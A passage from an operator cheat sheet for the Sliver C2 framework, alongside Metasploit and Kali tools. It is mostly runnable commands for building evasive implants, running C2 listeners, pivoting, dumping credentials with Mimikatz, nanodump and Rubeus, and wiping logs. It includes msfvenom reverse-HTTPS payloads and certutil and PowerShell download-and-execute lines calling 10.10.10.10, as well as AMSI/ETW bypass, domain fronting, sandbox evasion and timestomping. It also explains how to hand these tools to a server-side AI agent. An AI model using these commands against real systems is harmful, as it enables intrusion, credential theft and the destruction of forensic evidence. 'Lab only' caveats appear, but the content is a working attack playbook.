screenshot

# Capture keystrokes (use with caution — lab only)
# Requires armory extension

# Dump credentials
creds

# Manage loot
loot
loot add --name "hashes.txt" --type hash /path/to/file
loot remove <loot-id>

# Information gathering
whoami
getuid
getpid
```

### Transport Configuration

```sliver
# HTTP transport (in generate command)
generate --http 10.10.10.10:80 ...

# HTTPS transport (with custom cert)
generate --https 10.10.10.10:443 ...

# DNS transport
generate --dns c2.example.com ...

# mTLS transport (mutual TLS — most secure)
generate --mtls 10.10.10.10:4443 ...

# WireGuard transport (encrypted tunnel)
generate --wg 10.10.10.10 ...

# Multi-transport (fallback)
generate --http 10.10.10.10 --mtls 10.10.10.10:4443 --dns c2.example.com ...
```

> [!tip] Multi-Transport
> Always generate implants with at least one fallback C2 channel. If the primary listener goes down, the implant will rotate to the next configured transport.

### Armory (Extensions & Packages)

```sliver
# Update and search the armory index
armory update
armory search
armory search <keyword>

# Install a package
armory install <package-name>

# Common armory packages:
armory install nanodump       # LSASS credential dumping (BOF)
armory install rubeus         # Kerberos attacks
armory install sharphound     # BloodHound collector
armory install seatbelt       # Situational awareness
armory install chisel         # SOCKS proxy
armory install Watson         # Privilege escalation finder
armory install inline-execute-assembly  # In-process .NET execution

# List installed packages
armory installed

# List all available
armory list
```

> [!warning] Argument Escaping (`--`)
> Alias commands have Sliver shell flags in `--help`. Sliver's shell first lexically parses all arguments, and only unnamed positional arguments are passed to the alias. Use `--` to force positional parsing:
> ```sliver
> seatbelt -- -group=system     # ✅ Correct — passes "-group=system" to seatbelt
> seatbelt -group=system         # ❌ Fails — Sliver tries to parse -group as its flag
> seatbelt '' -group=system      # ✅ Alternative — empty string tricks parser
> ```

> [!info] Server AI Access
> Aliases/extensions used by the server-side AI agent live in:
> - `~/.sliver/ai/aliases/<tool>/` — e.g., `alias.json` + `Rubeus.exe`
> - `~/.sliver/ai/extensions/<tool>/` — e.g., `extension.json` + `nanodump.x64.o`
>
> Copy unpacked packages into these server-side paths for the AI agent to discover and execute them.

> [!warning] 256-Char Argument Limit
> Arguments to .NET assemblies and non-reflective PE extensions are limited to 256 characters (Donut loader limitation). Workaround: use `--in-process` for .NET assemblies or a BOF extension like `inline-execute-assembly`.

---

## 6. Common Tasks — Quick Workflow

> [!tip] Use This Section When
> You're mid-engagement and need the exact sequence of commands for common tasks. Each task is a step-by-step recipe.

---

### Task 1: Set Up a New Operation

```sliver
# 1. Start the server (daemon mode)
sliver-server daemon

# 2. Start multiplayer listener (server console)
[server] sliver > multiplayer

# 3. Generate operator configs for your team
[server] sliver > new-operator --name alice --lhost 1.2.3.4 --permissions all
[server] sliver > new-operator --name bob --lhost 1.2.3.4 --permissions all

# 4. Distribute .cfg files securely to operators
# Operators import: sliver-client import alice_1.2.3.4.cfg
```

---

### Task 2: Generate Your First Implant

```sliver
# 1. Create a profile (reusable config)
profiles new --name win-https-beacon \
  --https 1.2.3.4 --mtls 1.2.3.4:4443 \
  --beacon 60 --jitter 20 --format exe --arch amd64

# 2. Generate the implant from the profile
profiles generate --name win-https-beacon

# 3. Check output
implants
# Output: ~/.sliver/outputs/win-https-beacon.exe
```

---

### Task 3: Start Listeners

```sliver
# Start multiple listeners for redundancy
http --lhost 0.0.0.0 --lport 80
https --lhost 0.0.0.0 --lport 443 --cert ./cert.pem --key ./key.pem
mtls --lhost 0.0.0.0 --lport 4443
wg --lhost 0.0.0.0 --lport 53

# Verify
jobs
```

---

### Task 4: Interact with a Session

```sliver
# List and select
sessions          # or beacons
use 1             # or use SESSION_NAME

# Basic recon
whoami
getuid
getpid
ps
ifconfig
netstat

# File ops
ls C:\Users
upload ./tool.exe C:\Users\Public\tool.exe
download C:\Users\Public\secret.txt

# Execute
shell whoami
execute C:\Windows\System32\cmd.exe /c dir

# Done? Background or kill
background        # Keep session alive, return to menu
kill 1            # Terminate session
```

---

### Task 5: Set Up a Stager

```sliver
# 1. Create a shellcode profile
profiles new --name win-stage \
  --http 1.2.3.4 --format shellcode \
  --shellcode-entropy 3 --shellcode-compress

# 2. Start the staging listener
stage-listener --url http://1.2.3.4:8080 --profile win-stage

# 3. Generate stager with msfvenom (on your attack box)
msfvenom --payload windows/x64/custom/reverse_winhttp \
  LHOST=1.2.3.4 LPORT=8080 LURI=/test.woff \
  --format raw --out /tmp/stager.bin

# 4. Deliver stager to target and execute
```

---

### Task 6: Pivot Through an Implant

```sliver
# Inside an active session:
use 1

# Option A: SOCKS5 proxy
socks5 --bind 127.0.0.1:1080
# Then use proxychains: proxychains nmap -sT 10.0.0.0/24

# Option B: Port forward
portfwd add --bind 127.0.0.1:2222 --forward 10.0.0.5:22
# Then: ssh -p 2222 user@127.0.0.1

# Option C: SSH through implant
ssh --user root --password *** 10.0.0.5
```

---

### Task 7: Install & Use Armory Extensions

```sliver
# Update and find tools
armory update
armory search seatbelt

# Install
armory install seatbelt
armory install nanodump
armory install rubeus

# Run (note the -- for argument escaping)
seatbelt -- -group=system
rubeus -- kerberoast /outfile:hashes.txt

# Install all common tools at once
armory install seatbelt rubeus sharphound nanodump chisel
```

---

### Task 8: Convert Session ↔ Beacon

```sliver
# Session too noisy? Convert to beacon (asynchronous)
session-to-beacon 1

# Need real-time interaction? Convert beacon to session
beacon-to-session ABC123

# Check status
sessions
beacons
```

---

### Task 9: Monitor Implant Detection

```sliver
# Configure watchtower (one-time server setup)
# Edit ~/.sliver/configs/server.json:
# {
#   "watch_tower": {
#     "vt_api_key": "YOUR_VT_KEY",
#     "xforce_api_key": "YOUR_XFORCE_KEY",
#     "xforce_api_password": "YOUR_XFORCE_PASS"
#   }
# }

# Start monitoring
monitor start

# Check status anytime
monitor
```

---

### Task 10: Clean Up After Engagement

```sliver
# On each implant session
rm C:\Users\Public\implant.exe
rm /tmp/implant

# Self-terminate implants
die

# Stop listeners
jobs
jobs kill 1
jobs kill 2

# Review loot
loot

# Remove profiles if needed
profiles rm win-https-beacon
```

---

## 7. Cheat Sheet

### Session & Beacon Commands

| Command | Description | Example |
|---------|-------------|---------|
| `sessions` | List active sessions | `sessions` |
| `beacons` | List active beacons | `beacons` |
| `use <id>` | Interact with session/beacon | `use 1` |
| `background` | Return to main menu | `background` |
| `kill <id>` | Kill session/beacon | `kill 1` |
| `beacon-to-session` | Promote beacon to session | `beacon-to-session ABC123` |
| `session-to-beacon` | Demote session to beacon | `session-to-beacon 1` |

### Generation Commands

| Command | Description | Example |
|---------|-------------|---------|
| `generate` | Create new implant | `generate --http 10.0.0.1 --format exe` |
| `profiles new` | Create implant profile | `profiles new --name win --http 10.0.0.1 --format exe` |
| `profiles generate` | Build from profile | `profiles generate --name win` |
| `implants` | List generated implants | `implants` |
| `regenerate` | Rebuild a previous implant | `regenerate --name my-implant` |

### Listener Commands

| Command | Description | Example |
|---------|-------------|---------|
| `http` | Start HTTP listener | `http --lhost 0.0.0.0 --lport 80` |
| `https` | Start HTTPS listener | `https --lhost 0.0.0.0 --lport 443` |
| `dns` | Start DNS listener | `dns --domains c2.example.com` |
| `mtls` | Start mTLS listener | `mtls --lhost 0.0.0.0 --lport 4443` |
| `wg` | Start WireGuard listener | `wg --lhost 0.0.0.0 --lport 53` |
| `jobs` | List running listeners | `jobs` |
| `jobs kill <id>` | Stop a listener | `jobs kill 1` |

### File Commands

| Command | Description | Example |
|---------|-------------|---------|
| `upload` | Upload file to target | `upload ./tool.exe C:\Users\Public\tool.exe` |
| `download` | Download file from target | `download C:\Users\Public\hashes.txt` |
| `ls` | List directory | `ls C:\Windows\Temp` |
| `cd` | Change directory | `cd /tmp` |
| `cat` | Read file contents | `cat /etc/passwd` |
| `rm` | Remove file | `rm C:\Users\Public\tool.exe` |
| `mkdir` | Create directory | `mkdir C:\Users\Public\tools` |

### Recon Commands

| Command | Description | Example |
|---------|-------------|---------|
| `ps` | List processes | `ps` |
| `ifconfig` | Network interfaces | `ifconfig` |
| `netstat` | Network connections | `netstat` |
| `ping` | Ping host | `ping 192.168.1.1` |
| `resolve` | DNS lookup | `resolve target.local` |
| `whoami` | Current username | `whoami` |
| `getuid` | Get user ID | `getuid` |
| `getpid` | Get implant PID | `getpid` |

### Post-Exploitation Commands

| Command | Description | Example |
|---------|-------------|---------|
| `shell` | Execute shell command | `shell whoami` |
| `execute` | Run binary on target | `execute cmd.exe /c whoami` |
| `interactive` | Open interactive shell | `interactive` |
| `migrate` | Migrate to process | `migrate 1234` |
| `getsystem` | Elevate to SYSTEM | `getsystem` |
| `screenshot` | Capture screenshot | `screenshot` |
| `kill` | Kill a process | `kill 1234` |
| `die` | Terminate implant | `die` |
| `creds` | View stored credentials | `creds` |
| `loot` | Manage looted files | `loot` |

### Pivoting Commands

| Command | Description | Example |
|---------|-------------|---------|
| `portfwd add` | Add local port forward | `portfwd add --bind 127.0.0.1:8888 --forward 10.0.0.5:80` |
| `portfwd add --remote` | Add remote-exposed forward | `portfwd add --remote --bind 0.0.0.0:80 --forward 10.0.0.5:80` |
| `portfwd` | List port forwards | `portfwd` |
| `portfwd remove` | Remove port forward | `portfwd remove 1` |
| `rportfwd add` | Add reverse port forward | `rportfwd add --bind 0.0.0.0:8080 --forward 10.10.10.10:9090` |
| `rportfwd` | List reverse forwards | `rportfwd` |
| `rportfwd remove` | Remove reverse forward | `rportfwd remove 1` |
| `socks5` | Start SOCKS5 proxy | `socks5 --bind 127.0.0.1:1080` |
| `socks5 stop` | Stop SOCKS5 proxy | `socks5 stop 1` |
| `ssh` | SSH through implant | `ssh --user root --password pass 10.0.0.5` |

### Implant Formats

| Format | Flag | Use Case |
|--------|------|----------|
| Windows EXE | `--format exe` | Standalone executable |
| Windows DLL | `--format dll` | DLL sideloading |
| Windows Service | `--format service` | Service installation |
| Shellcode | `--format shellcode` | Injection / exploit payload |
| Linux ELF | `--format elf` | Standalone Linux binary |
| macOS Mach-O | `--format macho` | Standalone macOS binary |

---

### Stager Commands

| Command | Description | Example |
|---------|-------------|---------|
| `stage-listener` | Start staging listener | `stage-listener --url http://IP:PORT --profile win-shellcode` |
| `stage-listener --prepend-size` | TCP stager (Metasploit) | `stage-listener --url tcp://IP:PORT --profile win-shellcode --prepend-size` |
| `profiles new --format shellcode` | Create shellcode profile | `profiles new --name win-shellcode --mtls IP --format shellcode` |
| `shellcode-encoders` | List shellcode encoders | `shellcode-encoders` |

### Loot Commands

| Command | Description | Example |
|---------|-------------|---------|
| `loot` | List all loot | `loot` |
| `loot remote` | Pull file from target to loot store | `loot remote` |
| `loot local` | Add local file to loot store | `loot local` |
| `loot fetch` | View/download loot | `loot fetch` |
| `loot rm` | Remove loot | `loot rm` |

### Monitor & MCP Commands

| Command | Description | Example |
|---------|-------------|---------|
| `monitor start` | Start VT/X-Force monitoring | `monitor start` |
| `monitor stop` | Stop monitoring | `monitor stop` |
| `mcp` | Show MCP server status | `mcp` |
| `mcp start` | Start MCP server | `mcp start --transport http` |
| `mcp stop` | Stop MCP server | `mcp stop` |

### Multiplayer & Builder Commands

| Command | Description | Example |
|---------|-------------|---------|
| `multiplayer` | Start multiplayer listener | `multiplayer` |
| `new-operator` | Generate operator config | `new-operator --name alice --lhost 1.2.3.4 --permissions all` |
| `operators` | List connected operators | `operators` |
| `builders` | List external builders | `builders` |
| `generate --external-builder` | Offload build to external | `generate --mtls IP --os mac --arch arm64 --external-builder` |

### C2 Advanced Options

| Parameter | Description | Example |
|-----------|-------------|---------|
| `?driver=wininet` | Force Windows HTTP driver | `generate --http http://IP?driver=wininet` |
| `?proxy=URI` | HTTP proxy | `generate --http http://IP?proxy=http://proxy:8080` |
| `?host-header=HOST` | Domain fronting | `generate --http http://IP?host-header=cdn.com` |
| `?force-http=true` | Disable HTTPS | `generate --http http://IP?force-http=true` |
| `?resolvers=IP+IP` | Custom DNS resolvers | `generate --dns c2.com?resolvers=1.1.1.1+9.9.9.9` |
| `?retry-count=N` | DNS retry count | `generate --dns c2.com?retry-count=3` |

---

## 8. Profiles & Implant Generation

### Creating Profiles

Profiles save you from retyping long `generate` commands. Define your implant config once, rebuild anytime.

```sliver
# HTTP Windows profile
profiles new --name win-http --http 10.10.10.10 --format exe --arch amd64

# HTTPS with mTLS fallback
profiles new --name win-secure --https 10.10.10.10 --mtls 10.10.10.10:4443 --format exe

# DNS beacon (low & slow)
profiles new --name lin-dns-beacon --dns c2.example.com --beacon 120 --format elf

# Multi-protocol with custom interval
profiles new --name stealth-win \
  --http 10.10.10.10 \
  --dns c2.example.com \
  --beacon 60 \
  --jitter 10 \
  --format exe

# WireGuard profile
profiles new --name wg-tunnel --wg 10.10.10.10 --format exe
```

### Generating from Profiles

```sliver
# List profiles
profiles

# Generate an implant from a profile
profiles generate --name win-http

# Output goes to ~/.sliver/outputs/
```

### Advanced Generation Options

```sliver
# Custom binary name (OPSEC — avoid suspicious names)
generate --name svchost --http 10.10.10.10 --format exe

# Evasion options
generate --name evasive --http 10.10.10.10 --format exe \
  --skip-symbols \
  --evasion

# Disable service indicators
generate --name clean --http 10.10.10.10 --format exe \
  --skip-symbols

# Custom C2 interval and jitter (beacons)
generate --name slow-beacon --http 10.10.10.10 --beacon 300 --jitter 30 --format exe

# Debug mode (for lab — more verbose output)
generate --name debug-implant --http 10.10.10.10 --format exe --debug

# Limit max connection errors before implant exits
generate --name resilient --http 10.10.10.10 --max-errors 50 --format exe
```

### Implant Naming Convention

> [!tip] OPSEC Tip
> Use randomized or blend-in names for implants. Sliver generates random codenames by default (e.g., `TANGY_HORIZON`), but you can override:

```sliver
# Random codename (default)
generate --http 10.10.10.10 --format exe

# Custom name (use something that blends in)
generate --name svchost --http 10.10.10.10 --format exe
generate --name update --http 10.10.10.10 --format exe
```

---

## 9. Listener Types

### Comparison Table

| Listener | Protocol | Stealth | Reliability | Use Case |
|----------|----------|---------|-------------|----------|
| **HTTP** | TCP/HTTP | ⭐⭐⭐ | ⭐⭐⭐⭐ | Default C2, easy to set up, works through proxies |
| **HTTPS** | TCP/HTTPS | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Encrypted C2, blends with web traffic |
| **DNS** | UDP/DNS | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | Highly evasive, works behind restrictive firewalls |
| **mTLS** | TCP/TLS | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Secure operator→server, most reliable |
| **WireGuard** | UDP/WG | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Encrypted tunnel, great for pivoting |
| **Named Pipe** | SMB pipe | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | LAN-only, no network indicators, lateral movement |

### HTTP Listener

```sliver
# Basic HTTP listener
http --lhost 0.0.0.0 --lport 80

# With custom domain (for redirector setups)
http --lhost 0.0.0.0 --lport 80 --domain c2.example.com
```

> [!tip] Redirectors
> In real ops, never expose your Sliver server directly. Place a redirector (Nginx/Caddy/Apache) in front. Point DNS to redirector → redirector forwards to Sliver.

### HTTPS Listener

```sliver
# HTTPS with custom certs (recommended)
https --lhost 0.0.0.0 --lport 443 --cert ./cert.pem --key ./key.pem

# With long domain for domain fronting
https --lhost 0.0.0.0 --lport 443 --domain cdn.example.com
```

### DNS Listener

```sliver
# DNS C2 — requires domain delegation
dns --domains c2.example.com --lhost 0.0.0.0

# Configure your DNS zone:
# c2.example.com NS → your-sliver-server
# The server responds to DNS queries from implants
```

> [!warning] DNS Setup
> DNS C2 requires proper NS record delegation. Create an NS record pointing `c2.example.com` to your Sliver server's hostname, then add an A record for that hostname. This is not plug-and-play like HTTP.

### WireGuard Listener

```sliver
# Start WireGuard listener
wg --lhost 0.0.0.0 --lport 53

# Generate an implant that uses WireGuard
generate --name wg-implant --wg 10.10.10.10 --format exe

# WireGuard creates an encrypted tunnel — excellent for:
# - Evading deep packet inspection
# - Full tunneling / pivoting
# - C2 that looks like VPN traffic
```

### mTLS Listener

```sliver
# Mutual TLS — both sides verify certificates
mtls --lhost 0.0.0.0 --lport 4443

# Generate implant with mTLS
generate --name mtls-implant --mtls 10.10.10.10:4443 --format exe

# Primary use: operator→server connections and reliable C2
```

### Named Pipe Listener

```sliver
# Named pipe — SMB-based, LAN-only
named-pipe --name sliver_pipe

# Implants connect via SMB pipe — no network traffic leaves the LAN
# Excellent for lateral movement within a domain
```

---

## 10. OPSEC Considerations

> [!danger] Lab Only
> The techniques below are for authorized red team engagements and lab practice. Misuse is illegal.

---

### Evasion & Bypass Techniques 🛡️

This section covers practical evasion using **Sliver C2**, **Metasploit**, and **Kali Linux** tooling. Defense has improved significantly — static AV bypass alone is insufficient. Modern evasion requires a layered approach.

#### Layer 1: Static Analysis Bypass (AV)

**Goal:** Get the implant past signature-based and heuristic detection.

| Technique | Sliver | Metasploit | Kali Tools |
|-----------|--------|------------|------------|
| Symbol stripping | `--skip-symbols` | N/A | `strip --strip-all binary` |
| Binary obfuscation | `--evasion` | `msfvenom --encoder` | `obfuscator-llvm`, `UPX` |
| Shellcode compression | `--shellcode-compress` | `msfvenom -e x86/shikata_ga_nai` | `shellnoob` |
| Entropy randomization | `--shellcode-entropy 3` | `msfvenom -i 5` (iterations) | `peCloak`, `peCloakCapa` |
| Custom compile | Regenerate per target | N/A | Custom source build |

**Sliver Evasion Flags:**

```sliver
# Full evasion build
sliver > generate --name evasive --http 10.10.10.10 --format exe \
  --skip-symbols \
  --evasion \
  --shellcode-entropy 3

# Shellcode with compression and bypass
sliver > generate --name shell-evade --http 10.10.10.10 --format shellcode \
  --shellcode-compress \
  --shellcode-entropy 3 \
  --shellcode-bypass 2 \
  --shellcode-exitopt 1
```

**Metasploit Encoding (Kali):**

```bash
# Shikata Ga Nai encoder (most common, still effective against basic AV)
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 \
  -e x64/xor_dynamic -i 5 -f exe -o payload.exe

# Multiple encoders (chain encoding)
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 \
  -e x64/xor_dynamic -i 3 \
  -e x64/shikata_ga_nai -i 3 \
  -f exe -o encoded_payload.exe

# List available encoders
$ msfvenom --list encoders

# Best encoders for x64:
# - x64/xor_dynamic (good evasion, low entropy increase)
# - x64/shikata_ga_nai (classic, well-known, may flag some AV)
# - x64/zutto_dekiru (polymorphic)
```

**Kali Binary Obfuscation Tools:**

```bash
# 1. UPX packing (compresses executable, may bypass some signatures)
$ upx --best --ultra-brute payload.exe -o packed.exe
# Warning: UPX signatures are well-known, may trigger AV

# 2. Shellcode encoding with shellnoob
$ shellnoob -i shellcode.bin -e x86/shikata_ga_nai -c 3 -o encoded_shellcode.bin

# 3. PE manipulation with peCloak (Python tool)
$ git clone https://github.com/v-p-b/peCloak.py && cd peCloak.py
$ python pecloak.py -i payload.exe -o cloaked.exe --add-section .null --fill-random

# 4. Hyperion (AES encrypter)
$ hyperion payload.exe encrypted_payload.exe

# 5. Binary patching with x64dbg/ghidra (manual)
# - Modify PE header fields
# - Add junk sections
# - Change compile timestamps
# - Modify rich header
```

---

#### Layer 2: Behavioral Bypass (EDR/Behavior Monitoring)

**Goal:** Avoid triggering heuristics, sandbox, and behavioral detection.

| Technique | Sliver | Metasploit | Kali Tools |
|-----------|--------|------------|------------|
| Process migration | `migrate <pid>` | `migrate <pid>` | N/A |
| Living-off-the-land | LOTL commands via `shell` | LOLBAS via `execute` | LOLBAS, GTFOBins |
| Memory-only execution | Shellcode injection | `migrate` + `execute` | `donut`, `sRDI` |
| AMSI bypass | Armory extension | `amsi_bypass` module | `amsi.fail` |
| ETW patching | Armory extension | `patch_etw` module | Custom BOF |
| Process hollowing | Armory/BOF | Custom module | `process_hollowing` tools |

**Sliver Behavioral Techniques:**

```sliver
# 1. Migrate to a legitimate process (avoid spawning suspicious processes)
sliver (IMPLANT) > ps
sliver (IMPLANT) > migrate 1234  # PID of explorer.exe, svchost.exe, etc.

# 2. Use living-off-the-land binaries (LOLBAS)
sliver (IMPLANT) > shell certutil -urlcache -split -f http://10.10.10.10/payload.exe C:\Users\Public\legit.exe
sliver (IMPLANT) > shell powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"
sliver (IMPLANT) > shell wmic process call create "C:\Windows\System32\calc.exe"

# 3. Memory-only execution via execute-assembly (Sliver)
sliver (IMPLANT) > execute-assembly /tools/Rubeus.exe kerberoast
# Runs .NET assembly in-memory, no disk write

# 4. Sideloading DLLs (no process spawn)
sliver (IMPLANT) > sideload /tools/mimikatz.dll

# 5. Install and use Armory evasion extensions
sliver > armory install amsi-bypass
sliver (IMPLANT) > execute-extension amsi-bypass

sliver > armory install etw-patch
sliver (IMPLANT) > execute-extension etw-patch
```

**Metasploit Evasion Modules (Kali):**

```bash
$ msfconsole -q

# AMSI bypass (Anti-Malware Scan Interface)
msf6 > use post/windows/manage/amsi_bypass
msf6 (amsi_bypass) > set SESSION 1
msf6 (amsi_bypass) > run

# ETW patching (Event Tracing for Windows)
msf6 > use post/windows/manage/patch_etw
msf6 (patch_etw) > set SESSION 1
msf6 (patch_etw) > run

# PowerShell downgrade (avoids ScriptBlock logging)
msf6 > use post/windows/manage/powershell_downgrade
msf6 (powershell_downgrade) > set SESSION 1
msf6 (powershell_downgrade) > run

# Migrate to stable process
msf6 > run post/windows/manage/migrate

# Load Mimikatz without writing to disk
meterpreter > load kiwi
meterpreter > creds_all
```

**Kali Evasion Utilities:**

```bash
# 1. Donut — Convert .NET PE to shellcode for in-memory execution
$ donut -i Rubeus.exe -o rubeus.bin
# Then inject with Sliver's execute-assembly or custom injector

# 2. sRDI — Shellcode Reflective DLL Injection
$ python sRDI.py Mimikatz.dll -f go -o mimikatz_shellcode.bin

# 3. Invoke-Obfuscation (PowerShell obfuscation)
$ pwsh
PS> Import-Module ./Invoke-Obfuscation.psd1
PS> Invoke-Obfuscation
# Interactive menu to obfuscate any PowerShell script

# 4. Amsi.fail — Generate AMSI bypass one-liners
# https://amsi.fail/ or local:
$ git clone https://github.com/Flangvik/AMSI.fail

# 5. SharpHide — Hide registry run keys
$ SharpHide.exe action=add keyvalue="C:\Users\Public\implant.exe"

# 6. Timestomp — Modify file timestamps (forensics evasion)
$ timestomp payload.exe -m "2026-01-15 08:30:00" -a "2026-01-15 08:30:00"
```

---

#### Layer 3: Network Traffic Evasion

**Goal:** Blend C2 traffic, avoid network signatures, evade DPI.

| Technique | Sliver | Metasploit | Kali Tools |
|-----------|--------|------------|------------|
| Domain fronting | `--host-header` param | `set HttpHostHeader` | CDN setup |
| DNS C2 | `--dns` listener | DNS payloads | `dnscat2` |
| WireGuard tunnel | `--wg` listener | N/A | `wg-quick` |
| Malleable profiles | Custom C2 params | `.rc` scripts | Custom profile |
| Jitter/beacon variance | `--jitter` | `set SessionExpirationTimeout` | N/A |
| Redirectors | Nginx/SOCAT | N/A | `socat`, `redsocks` |

**Sliver Network Evasion:**

```sliver
# 1. Domain fronting (hide true C2 IP behind CDN)
sliver > generate --https cdn.cloudflare.com?host-header=legit-site.com --format exe

# 2. DNS C2 for restrictive firewalls
sliver > dns --domains c2.example.com --lhost 0.0.0.0
sliver > generate --dns c2.example.com --beacon 300 --jitter 50 --format exe

# 3. WireGuard for encrypted tunnel (looks like VPN)
sliver > wg --lhost 0.0.0.0 --lport 53
sliver > generate --wg 10.10.10.10:53 --format exe

# 4. Slow beacon with high jitter (low-and-slow)
sliver > generate --http 10.10.10.10 --beacon 600 --jitter 40 --format exe
# Calls back every 360-840 seconds (10-14 min range)

# 5. Multiple C2 protocols (fallback)
sliver > generate --http 10.10.10.10 --dns c2.example.com --wg 10.10.10.10 --format exe
```

**Metasploit Network Evasion (Kali):**

```bash
# 1. Domain fronting with Meterpreter
msf6 > use exploit/multi/handler
msf6 (handler) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 (handler) > set LHOST cdn.example.com
msf6 (handler) > set HttpHostHeader legitimate-site.com
msf6 (handler) > run

# 2. DNS-based payload delivery
msf6 > use auxiliary/server/dns
msf6 (dns) > run

# 3. Session communication timeout (reduce traffic)
msf6 (handler) > set SessionCommunicationTimeout 600
msf6 (handler) > set SessionExpirationTimeout 604800  # 7 days

# 4. SSL certificate (custom, not self-signed)
msf6 (handler) > set StagerVerifySSLCert true
```

**Kali Redirector Setup:**

```bash
# SOCAT redirector (simple port forward, hide true C2)
$ socat TCP4-LISTEN:443,fork TCP4:10.10.10.10:443

# HTTPS redirector with Nginx
# /etc/nginx/sites-available/c2-redirect:
server {
    listen 443 ssl;
    server_name c2.example.com;
    
    ssl_certificate /etc/letsencrypt/live/c2.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;
    
    location / {
        proxy_pass http://10.10.10.10:80;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}

# DNS redirector (redirect DNS queries to Sliver DNS)
$ iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 10.10.10.10:53
```

---

#### Layer 4: Sandbox & Analysis Evasion

**Goal:** Detect and evade automated analysis environments.

| Technique | Sliver | Metasploit | Kali Tools |
|-----------|--------|------------|------------|
| Environment checks | Custom scripts | `post/multi/gather/env` | `checkvm`, `al-khaser` |
| Sleep/timing evasion | `--beacon` delays | `sleep` command | N/A |
| User interaction wait | BOF/extension | `getuid` checks | Custom code |
| VM artifact detection | Armory extension | Custom module | `VMDetector` |

**Sliver Sandbox Evasion:**

```sliver
# 1. Check for VM artifacts before executing (via shell)
sliver (IMPLANT) > shell wmic bios get serialnumber
sliver (IMPLANT) > shell wmic baseboard get product
# Compare against known VM identifiers (VMware, VirtualBox, QEMU)

# 2. Armory extension for VM detection
sliver > armory search vm
sliver > armory install vm-detect
sliver (IMPLANT) > execute-extension vm-detect

# 3. Use beacon mode (delays execution, may timeout sandbox)
sliver > generate --http 10.10.10.10 --beacon 120 --format exe
```

**Metasploit Sandbox Checks (Kali):**

```bash
# Check for VM/sandbox indicators
msf6 > use post/multi/gather/checkvm
msf6 (checkvm) > set SESSION 1
msf6 (checkvm) > run

# Environment enumeration
msf6 > use post/multi/gather/env
msf6 (env) > set SESSION 1
msf6 (env) > run

# Manual sandbox checks via Meterpreter
meterpreter > sysinfo
meterpreter > run post/windows/gather/enum_virtualization
```

**Kali VM Detection Tools:**

```bash
# 1. al-khaser (comprehensive VM detection)
$ git clone https://github.com/LordNoteworthy/al-khaser && cd al-khaser
$ make && ./al-khaser

# 2. Check VM artifacts manually
$ dmidecode -t system | grep -i manufacturer
$ lscpu | grep -i hypervisor

# 3. pafish (Paranoid Fish) — VM/sandbox detection test
$ git clone https://github.com/a0rtega/pafish && cd pafish
$ make && ./pafish.exe
```

---

#### Layer 5: Post-Exploitation OPSEC

**Goal:** Minimize artifacts and evidence after compromise.

| Technique | Sliver | Metasploit | Kali Tools |
|-----------|--------|------------|------------|
| Memory-only tools | `execute-assembly` | `mimikatz` in mem | `donut` |
| Log clearing | `shell wevtutil` | `clearev` | `wevtutil`, `auditpol` |
| File cleanup | `rm` command | `rm` module | `srm`, `shred` |
| Timestamp manipulation | `shell timestomp` | `timestomp` | `touch` |
| Process hiding | BOF/extension | `migrate` | Rootkits |

**Sliver Cleanup:**

```sliver
# 1. Clear Windows event logs
sliver (IMPLANT) > shell wevtutil cl Security
sliver (IMPLANT) > shell wevtutil cl System
sliver (IMPLANT) > shell wevtutil cl Application

# 2. Timestomp files (modify timestamps to blend in)
sliver (IMPLANT) > shell powershell -c "(Get-Item 'C:\Users\Public\implant.exe').LastWriteTime = '2026-01-15 08:30:00'"

# 3. Remove all tools and implants
sliver (IMPLANT) > rm C:\Users\Public\implant.exe
sliver (IMPLANT) > rm C:\Windows\Temp\*

# 4. Terminate cleanly (no crash artifacts)
sliver (IMPLANT) > die
```

**Metasploit Cleanup (Kali):**

```bash
# Clear event logs
meterpreter > clearev

# Timestomp file
meterpreter > timestomp C:\Users\Public\implant.exe -z "01/15/2026 08:30:00"

# Remove files
meterpreter > rm C:\Users\Public\implant.exe

# Kill traces from registry (persistence removal)
msf6 > use post/windows/manage/delete_registry
msf6 (delete_registry) > set KEY "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyBackdoor"
msf6 (delete_registry) > run
```

**Kali Forensics Countermeasures:**

```bash
# 1. Secure file deletion
$ srm -z payload.exe  # Overwrite with zeros, then delete
$ shred -vfz -n 5 payload.exe  # 5 passes of random data + zeros

# 2. Clear bash history
$ history -c && history -w
$ echo "" > ~/.bash_history

# 3. Clear system logs (on compromised Linux host)
$ echo "" > /var/log/auth.log
$ echo "" > /var/log/syslog
$ journalctl --vacuum-time=1s

# 4. Modify file timestamps
$ touch -d "2026-01-15 08:30:00" payload.exe
$ touch -r /bin/ls payload.exe  # Copy timestamps from legitimate file
```

---

### Evasion Workflow Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                    LAYERED EVASION WORKFLOW                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐          │
│  │   BUILD     │ →  │   DELIVER   │ →  │   EXECUTE   │          │
│  │             │    │             │    │             │          │
│  │ Sliver:     │    │ Redirector  │    │ AMSI bypass │          │
│  │ --evasion   │    │ Domain      │    │ ETW patch   │          │
│  │ --skip-     │    │  fronting   │    │ Migrate     │          │
│  │   symbols   │    │ DNS/WG C2   │    │ LOTL        │          │
│  │             │    │             │    │             │          │
│  │ MSF:        │    │             │    │ Memory-only │          │
│  │ msfvenom    │    │             │    │ tools       │          │
│  │ encoders    │    │             │    │             │          │
│  │             │    │             │    │             │          │
│  │ Kali:       │    │             │    │             │          │
│  │ UPX, obfus- │    │             │    │             │          │
│  │ cator-llvm  │    │             │    │             │          │
│  └─────────────┘    └─────────────┘    └─────────────┘          │
│         │                  │                  │                  │
│         ▼                  ▼                  ▼                  │
